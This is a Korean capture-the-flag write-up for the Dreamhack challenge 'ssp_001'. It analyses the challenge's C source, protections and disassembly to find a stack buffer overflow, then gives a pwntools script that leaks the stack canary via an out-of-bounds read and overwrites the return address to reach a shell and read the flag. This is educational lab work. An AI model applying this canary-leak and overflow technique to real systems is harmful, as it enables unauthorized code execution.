## 개요

- 분야: Pwnable
- 주제: Stack Buffer Overflow + Stack Canary
- 환경: Linux

---

## ssp_001의 C코드
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\n", idx, box[idx]);
}
void menu() {
    puts("[F]ill the box");
    puts("[P]rint the box");
    puts("[E]xit");
    printf("> ");
}
int main(int argc, char *argv[]) {
    unsigned char box[0x40] = {};
    char name[0x40] = {};
    char select[2] = {};
    int idx = 0, name_len = 0;
    initialize();
    while(1) {
        menu();
        read(0, select, 2);
        switch( select[0] ) {
            case 'F':
                printf("box input : ");
                read(0, box, sizeof(box));
                break;
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);
                return 0;
            default:
                break;
        }
    }
```
C코드를 보았을때 name에 SBOF취약점이 있다는 것을 알수있다.
```console
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```
또한 checksce명령어를 이용해 카나리가 켜져있고 i386아키택처 라는 것을 알수 있었다.

---

## 어셈블리

```asm
0x0804872b <+0>:     push   ebp
   0x0804872c <+1>:     mov    ebp,esp
   0x0804872e <+3>:     push   edi
   0x0804872f <+4>:     sub    esp,0x94
   0x08048735 <+10>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048738 <+13>:    mov    DWORD PTR [ebp-0x98],eax
   0x0804873e <+19>:    mov    eax,gs:0x14
   0x08048744 <+25>:    mov    DWORD PTR [ebp-0x8],eax
   0x08048747 <+28>:    xor    eax,eax
   0x08048749 <+30>:    lea    edx,[ebp-0x88]
   0x0804874f <+36>:    mov    eax,0x0
   0x08048754 <+41>:    mov    ecx,0x10
   0x08048759 <+46>:    mov    edi,edx
   0x0804875b <+48>:    rep stos DWORD PTR es:[edi],eax
   0x0804875d <+50>:    lea    edx,[ebp-0x48]
   0x08048760 <+53>:    mov    eax,0x0
   0x08048765 <+58>:    mov    ecx,0x10
   0x0804876a <+63>:    mov    edi,edx
   0x0804876c <+65>:    rep stos DWORD PTR es:[edi],eax
   0x0804876e <+67>:    mov    WORD PTR [ebp-0x8a],0x0
   0x08048777 <+76>:    mov    DWORD PTR [ebp-0x94],0x0
   0x08048781 <+86>:    mov    DWORD PTR [ebp-0x90],0x0
   0x0804878b <+96>:    call   0x8048672 <initialize>
   0x08048790 <+101>:   call   0x80486f1 <menu>
   0x08048795 <+106>:   push   0x2
   0x08048797 <+108>:   lea    eax,[ebp-0x8a]
   0x0804879d <+114>:   push   eax
   0x0804879e <+115>:   push   0x0
   0x080487a0 <+117>:   call   0x80484a0 <read@plt>
   0x080487a5 <+122>:   add    esp,0xc
   0x080487a8 <+125>:   movzx  eax,BYTE PTR [ebp-0x8a]
   0x080487af <+132>:   movsx  eax,al
   0x080487b2 <+135>:   cmp    eax,0x46
   0x080487b5 <+138>:   je     0x80487c6 <main+155>
   0x080487b7 <+140>:   cmp    eax,0x50
   0x080487ba <+143>:   je     0x80487eb <main+192>
   0x080487bc <+145>:   cmp    eax,0x45
   0x080487bf <+148>:   je     0x8048824 <main+249>
   0x080487c1 <+150>:   jmp    0x804887a <main+335>
   0x080487c6 <+155>:   push   0x804896c
   0x080487cb <+160>:   call   0x80484b0 <printf@plt>
   0x080487d0 <+165>:   add    esp,0x4
   0x080487d3 <+168>:   push   0x40
   0x080487d5 <+170>:   lea    eax,[ebp-0x88]
   0x080487db <+176>:   push   eax
   0x080487dc <+177>:   push   0x0
   0x080487de <+179>:   call   0x80484a0 <read@plt>
   0x080487e3 <+184>:   add    esp,0xc
   0x080487e6 <+187>:   jmp    0x804887a <main+335>
   0x080487eb <+192>:   push   0x8048979
   0x080487f0 <+197>:   call   0x80484b0 <printf@plt>
   0x080487f5 <+202>:   add    esp,0x4
   0x080487f8 <+205>:   lea    eax,[ebp-0x94]
   0x080487fe <+211>:   push   eax
   0x080487ff <+212>:   push   0x804898a
   0x08048804 <+217>:   call   0x8048540 <__isoc99_scanf@plt>
   0x08048809 <+222>:   add    esp,0x8
   0x0804880c <+225>:   mov    eax,DWORD PTR [ebp-0x94]
   0x08048812 <+231>:   push   eax
   0x08048813 <+232>:   lea    eax,[ebp-0x88]
   0x08048819 <+238>:   push   eax
   0x0804881a <+239>:   call   0x80486cc <print_box>
   0x0804881f <+244>:   add    esp,0x8
   0x08048822 <+247>:   jmp    0x804887a <main+335>
   0x08048824 <+249>:   push   0x804898d
   0x08048829 <+254>:   call   0x80484b0 <printf@plt>
   0x0804882e <+259>:   add    esp,0x4
   0x08048831 <+262>:   lea    eax,[ebp-0x90]
   0x08048837 <+268>:   push   eax
   0x08048838 <+269>:   push   0x804898a
   0x0804883d <+274>:   call   0x8048540 <__isoc99_scanf@plt>
   0x08048842 <+279>:   add    esp,0x8
   0x08048845 <+282>:   push   0x804899a
   0x0804884a <+287>:   call   0x80484b0 <printf@plt>
   0x0804884f <+292>:   add    esp,0x4
   0x08048852 <+295>:   mov    eax,DWORD PTR [ebp-0x90]
   0x08048858 <+301>:   push   eax
   0x08048859 <+302>:   lea    eax,[ebp-0x48]
   0x0804885c <+305>:   push   eax
   0x0804885d <+306>:   push   0x0
   0x0804885f <+308>:   call   0x80484a0 <read@plt>
   0x08048864 <+313>:   add    esp,0xc
   0x08048867 <+316>:   mov    eax,0x0
   0x0804886c <+321>:   mov    edx,DWORD PTR [ebp-0x8]
   0x0804886f <+324>:   xor    edx,DWORD PTR gs:0x14
   0x08048876 <+331>:   je     0x8048884 <main+345>
   0x08048878 <+333>:   jmp    0x804887f <main+340>
   0x0804887a <+335>:   jmp    0x8048790 <main+101>
   0x0804887f <+340>:   call   0x80484e0 <__stack_chk_fail@plt>
   0x08048884 <+345>:   mov    edi,DWORD PTR [ebp-0x4]
   0x08048887 <+348>:   leave
   0x08048888 <+349>:   ret
```
이걸로 name변수의 크기가 64바이트라는것, 카나리를 gs로 선언해 ebp-0x8에 저장한다는것을 알수있으며
스택구조가 name(64) | canary(4) | edi(4) | ebp(4) | ret 이라는 것도 알수있다.

---

## Exploit

```python
from pwn import *

r = remote("host3.dreamhack.games", 18992)
canary = []
for i in range(4):
    r.sendline(b"P")
    r.sendline(str(0x80 + i).encode())

    r.recvuntil(b"is : ")
    canary.append(int(r.recvline(), 16))

canary = bytes(canary)

print(canary)

payload = b'A' * 0x40 + canary
payload += b'A' * 0x4
payload += b'B' * 0x4
payload += p32(0x80486b9)

r.sendline(b'E')
r.sendline(str(len(payload)). encode())
r.sendline(payload)

r.interactive()
```
print(canary)위 코드는 카나리 릭으로 카나리의 값을 구하여 출력하게 한다.
그 아래의 코드는 name에 넣을 payload를 스택구조에 맞춰 만들며 보낼 데이터를 문자열로 바꾸고 길이를 구해 인코딩 시킨뒤 보낸다. 

---

## 결과
```console
jjang@wjw:/mnt/c/Users/jjang/Downloads/94032773-0b41-4062-a712-7650c915fc12$ python3 s.py
[+] Opening connection to host3.dreamhack.games on port 18992: Done
b'\x00\x90Ms'
[*] Switching to interactive mode
[F]ill the box
[P]rint the box
[E]xit
> Name Size : Name : $ ls
flag
run.sh
ssp_001
$ cat flag
DH{□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□}$
```
플래그가 출력되었다.
